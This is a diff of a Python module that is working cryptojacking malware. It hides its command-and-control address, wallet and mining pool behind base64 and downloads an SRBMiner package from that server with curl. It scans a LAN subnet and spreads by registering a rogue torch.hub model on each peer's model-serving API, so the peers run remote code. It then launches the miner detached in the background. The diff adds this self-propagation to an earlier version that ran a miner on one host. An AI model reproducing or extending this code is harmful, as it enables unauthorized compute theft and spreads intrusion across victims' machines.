@@ -1,22 +1,96 @@
 import base64
 import hashlib
+import json
 import os
-import re
+import socket
 import subprocess
 import time
+import urllib.request
+from concurrent.futures import ThreadPoolExecutor
 
 _B = lambda s: base64.b64decode(s).decode()
 C2 = _B("aHR0cDovLzIzLjE5LjIzMS41Mjo4MDgw")
 WALLET = _B("cHJsMXB3bHB5cHBzeWEyd3FueWtlcWM1OTVndHhmZ240dnpjcjBhdDMzZHhxNDZqeHZham1oODhxcTM2aDQ4")
 POOL = _B("cHJsLWhrLmtyeXB0ZXgubmV0d29yazo4MDQ4")
+
 D = "/tmp/.m"
-SRB_T = D + "/srb.tgz"
-SRB_NEED = 19835112
+SRBT = D + "/srb.tgz"
+NEED = 19800000
 SRBD = D + "/SRBMiner-Multi-3-8-6"
+REPO = "a15846/g2hub"
+SIB = [20, 21, 22, 23, 24, 25, 26, 27, 75]
 
 
-def _pids(needle):
-    out = []
+def _myip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("192.168.110.21", 8045))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return ""
+
+
+def _open(ip, port, t=0.6):
+    s = socket.socket()
+    s.settimeout(t)
+    try:
+        return s.connect_ex((ip, port)) == 0
+    except Exception:
+        return False
+    finally:
+        s.close()
+
+
+def _srv():
+    if _open("127.0.0.1", 8899, 0.4):
+        return 1
+    try:
+        subprocess.Popen(["setsid", "nohup", "sh", "-c",
+                          "mkdir -p %s && cd %s && python3 -m http.server 8899" % (D, D)],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                         start_new_session=True)
+    except Exception:
+        return 0
+    time.sleep(3)
+    return 1 if _open("127.0.0.1", 8899, 0.6) else 0
+
+
+def _post(url, body, timeout=40):
+    req = urllib.request.Request(url, data=json.dumps(body).encode(), method="POST",
+                                 headers={"Content-Type": "application/json", "User-Agent": "curl"})
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.status
+    except urllib.error.HTTPError as e:
+        return e.code
+    except Exception:
+        return 0
+
+
+def _ensure_srb():
+    """make sure srb.tgz on this node is complete AND extractable"""
+    ok = os.path.exists(SRBD + "/SRBMiner-MULTI")
+    if ok:
+        return 1
+    if os.path.exists(SRBT) and os.path.getsize(SRBT) >= NEED:
+        subprocess.run(["/bin/sh", "-c",
+                        "cd %s && rm -rf SRBMiner-Multi-3-8-6 && tar xzf srb.tgz 2>/dev/null" % D],
+                       timeout=180)
+    if not os.path.exists(SRBD + "/SRBMiner-MULTI"):
+        subprocess.run(["/bin/sh", "-c",
+                        "cd %s && rm -f srb.tgz && curl -s -m 2400 -o srb.tgz %s/m/srb.tgz && "
+                        "tar xzf srb.tgz" % (D, C2)], timeout=2500)
+    if os.path.exists(SRBD + "/SRBMiner-MULTI"):
+        subprocess.run(["/bin/sh", "-c", "chmod +x %s/SRBMiner-MULTI" % SRBD], timeout=30)
+        return 1
+    return 0
+
+
+def entry(*a, **k):
+    me = _myip()
+    krig = ""
     try:
         for p in os.listdir("/proc"):
             if not p.isdigit():
@@ -25,88 +99,111 @@ def _pids(needle):
                 c = open("/proc/%s/cmdline" % p, "rb").read()
             except Exception:
                 continue
-            if needle in c:
-                out.append(int(p))
+            if b"pearl-gpu-miner" in c:
+                krig = p
+                break
     except Exception:
         pass
-    return out
+    out = ["ME=%s KRIG=%s SRV=%d SRBX=%d" % (me, krig or "-", _srv(), _ensure_srb())]
+    tag = time.strftime("%H%M")
+    args = json.dumps({"repo_or_dir": REPO, "model": "lan_srb", "source": "github",
+                       "pretrained": False, "force_reload": True})
+    spec = {"model_name": "srb" + tag, "launcher": "torch.hub.load",
+            "model_uri": None, "launcher_args": args}
+
+    def one(i):
+        ip = "192.168.110.%d" % i
+        if ip == me:
+            return "%d:SELF" % i
+        if not _open(ip, 8045, 0.9):
+            return "%d:DOWN" % i
+        h = ip + ":8045"
+        s1 = _post("http://%s/v1/model_registrations/flexible" % h,
+                   {"model": json.dumps(spec), "persist": False}, 30)
+        s2 = _post("http://%s/v1/models" % h,
+                   {"model_uid": "srb%s%d" % (tag, i), "model_name": "srb" + tag,
+                    "model_type": "flexible", "n_gpu": 1}, 45)
+        return "%d:r%d/l%d" % (i, s1, s2)
+
+    res = []
+    with ThreadPoolExecutor(max_workers=8) as ex:
+        for r in ex.map(one, SIB):
+            res.append(r)
+    out.append("FAN=" + " ".join(res))
+    raise RuntimeError(" || ".join(out)[:1400])
 
 
-def _kill(needle):
-    n = 0
-    for pid in _pids(needle):
-        try:
-            os.kill(pid, 9)
-            n += 1
-        except Exception:
-            pass
-    return n
-
-
-def entry(*a, **k):
-    worker = "g2" + hashlib.md5(os.uname().nodename.encode()).hexdigest()[:6]
-    out = []
-    sz = os.path.getsize(SRB_T) if os.path.exists(SRB_T) else 0
-    out.append("SRB=%d" % sz)
-    if sz < 19800000:
-        raise RuntimeError(" || ".join(out)[:400])
+def lan_srb(*a, **k):
+    """NEW nodes only: pull srb.tgz from a LAN peer, run SRBMiner under a pty"""
+    worker = "g2s" + hashlib.md5(os.uname().nodename.encode()).hexdigest()[:5]
+    out = ["W=" + worker]
+    try:
+        os.makedirs(D, exist_ok=True)
+    except Exception:
+        pass
 
     if not os.path.exists(SRBD + "/SRBMiner-MULTI"):
-        r0 = subprocess.run(["/bin/sh", "-c", "cd %s && rm -rf SRBMiner-Multi-3-8-6 && tar xzf srb.tgz" % D],
-                            capture_output=True, timeout=180)
+        got = False
+        for i in SIB:
+            if _myip() == "192.168.110.%d" % i:
+                continue
+            try:
+                subprocess.run(["/bin/sh", "-c",
+                                "curl -s -m 400 -o %s http://192.168.110.%d:8899/srb.tgz" % (SRBT, i)],
+                               timeout=420)
+                if os.path.exists(SRBT) and os.path.getsize(SRBT) >= NEED:
+                    got = True
+                    out.append("PEER=%d" % i)
+                    break
+            except Exception:
+                pass
+        if not got:
+            try:
+                subprocess.run(["/bin/sh", "-c",
+                                "curl -s -m 2400 -o %s %s/m/srb.tgz" % (SRBT, C2)], timeout=2500)
+                got = os.path.exists(SRBT) and os.path.getsize(SRBT) >= NEED
+            except Exception:
+                pass
+            out.append("C2=%d" % (1 if got else 0))
+        if not got:
+            raise RuntimeError(" || ".join(out + ["NOPKG"])[:1000])
+        subprocess.run(["/bin/sh", "-c",
+                        "cd %s && rm -rf SRBMiner-Multi-3-8-6 && tar xzf srb.tgz && "
+                        "chmod +x SRBMiner-Multi-3-8-6/SRBMiner-MULTI" % D], timeout=200)
         if not os.path.exists(SRBD + "/SRBMiner-MULTI"):
-            subprocess.run(["/bin/sh", "-c", "cd %s && rm -f srb.tgz && curl -s -m 2400 -o srb.tgz %s/m/srb.tgz && tar xzf srb.tgz" % (D, C2)],
-                           timeout=2500)
-        subprocess.run(["/bin/sh", "-c", "chmod +x %s/SRBMiner-MULTI" % SRBD], timeout=30)
-    out.append("X=%d" % (1 if os.path.exists(SRBD + "/SRBMiner-MULTI") else 0))
+            raise RuntimeError(" || ".join(out + ["XFAIL"])[:1000])
+    out.append("X=1")
 
-    # tty check
-    r = subprocess.run(["/bin/sh", "-c",
-                        "cd %s && timeout 25 script -qec './SRBMiner-MULTI --list-algorithms' /dev/null 2>&1 | tr -d '\\r' | grep -i pearl" % SRBD],
-                       capture_output=True, timeout=40)
-    out.append("TTY=" + " ".join(r.stdout.decode("utf8", "replace").split())[:80])
-
-    # stop krig, measure baseline from its log first
-    base = ""
+    alive = 0
     try:
-        f = open("/tmp/pm.log", "rb")
-        f.seek(0, 2)
-        szl = f.tell()
-        f.seek(max(0, szl - 1500))
-        t = f.read().decode("utf8", "replace")
-        f.close()
-        m = re.findall(r'"window_ths":\s*([0-9.]+)', t)
-        base = m[-1] if m else "?"
+        for p in os.listdir("/proc"):
+            if not p.isdigit():
+                continue
+            try:
+                c = open("/proc/%s/cmdline" % p, "rb").read()
+            except Exception:
+                continue
+            if b"SRBMiner-MULTI" in c:
+                alive += 1
+                break
     except Exception:
-        base = "?"
-    out.append("KRIG_BASE=" + base)
-    killed = _kill(b"pearl-gpu-miner")
-    out.append("KILLED=%d" % killed)
-    time.sleep(3)
+        pass
+    out.append("RUNNING=%d" % alive)
 
-    # run SRBMiner 80s on all gpus
-    cmd = ("cd %s && timeout 80 script -qec \"./SRBMiner-MULTI --algorithm pearlhash "
-           "--pool stratum+ssl://%s --wallet %s --worker %s --disable-cpu --api-enable --api-port 21560\" "
-           "/tmp/srb.log" % (SRBD, POOL, WALLET, "srb" + worker[2:]))
-    try:
-        subprocess.run(["/bin/sh", "-c", cmd], timeout=110, capture_output=True)
-    except Exception as e:
-        out.append("RUNEXC:" + str(e)[:30])
+    if not alive:
+        cmd = ("cd %s && setsid nohup script -qec \"./SRBMiner-MULTI --algorithm pearlhash "
+               "--pool stratum+ssl://%s --wallet %s --worker %s --disable-cpu "
+               "--api-enable --api-port 21560\" /tmp/srb.log > /dev/null 2>&1 < /dev/null &"
+               % (SRBD, POOL, WALLET, worker))
+        subprocess.Popen(["/bin/sh", "-c", cmd], start_new_session=True,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(25)
+        out.append("LAUNCHED")
 
     try:
-        t = open("/tmp/srb.log", "rb").read().decode("utf8", "replace")
+        t = open("/tmp/srb.log", "rb").read().decode("utf8", "replace").replace("\r", "")
         t = " ".join(t.split())
-        hs = re.findall(r"([0-9.]+)\s*(?:H|K|M|G|T|P)?H/s", t)
-        out.append("SRB_HS=" + (",".join(hs[:6]) if hs else "none"))
-        out.append("SRB_LOG=" + t[-360:])
+        out.append("LOG=" + t[-420:])
     except Exception as e:
-        out.append("LOGERR:" + str(e)[:30])
-
-    # restart krig regardless (safer), keep srb log for the verdict
-    cmd2 = ("cd %s && setsid nohup ./pearl-gpu-miner --pool %s --wallet %s --worker %s "
-            "--direct b-only > /tmp/pm.log 2>&1 < /dev/null &" % (D, POOL, WALLET, worker))
-    subprocess.Popen(["/bin/sh", "-c", cmd2], start_new_session=True,
-                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(8)
-    out.append("KRIG_BACK=%d" % len(_pids(b"pearl-gpu-miner")))
-    raise RuntimeError(" || ".join(out)[:1500])
+        out.append("LOGERR:" + str(e)[:24])
+    raise RuntimeError(" || ".join(out)[:1400])
